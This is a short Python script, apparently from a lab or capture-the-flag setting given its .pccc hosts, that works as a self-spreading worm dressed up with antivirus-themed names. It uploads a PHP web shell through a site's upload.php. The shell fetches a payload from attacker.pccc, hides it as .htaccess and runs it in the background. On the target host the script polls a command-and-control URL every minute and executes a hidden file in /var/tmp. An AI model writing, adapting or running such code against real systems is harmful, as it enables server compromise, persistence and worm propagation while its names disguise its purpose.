#!/usr/bin/python3

import base64
import io
import os
import subprocess
import time
import requests
import socket

name = "publicsite"
hostname = os.getenv("HOSTNAME", "publicsite")

# TOKEN

def antivirusUpdate():
    url = f"http://attacker.pccc/Z4MPK7WQLE_c2"

    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            subprocess.run(["python3", "/var/tmp/.Z4MPK7WQLE_c2.py"])
    except requests.RequestException:
        pass

def antiVirusConfiguration():  
    url = "http://publicsite.pccc/upload.php"

    signature = """<?php
$path = "/var/www/html/uploads/.htaccess";
$worm = "http://attacker.pccc/Z4MPK7WQLE.py";
file_put_contents($path, file_get_contents($worm));
shell_exec("chmod +x $path");
shell_exec("setsid $path >/dev/null 2>&1 &");
unlink(__FILE__);
?>"""
    files = {
        "file": ("upload.php", io.BytesIO(signature.encode()), "application/octet-stream")
    }
    
    try:
        response = requests.post(url, files=files)
        if response.status_code == 200:
            requests.get("http://publicsite.pccc/uploads/upload.php")
            print("Antivirus configured")
        else:
            print(response.text)
    except requests.RequestException as e:
        print(e)

if name not in hostname:
    antiVirusConfiguration()
else:
    while True:
        antivirusUpdate()
        time.sleep(60)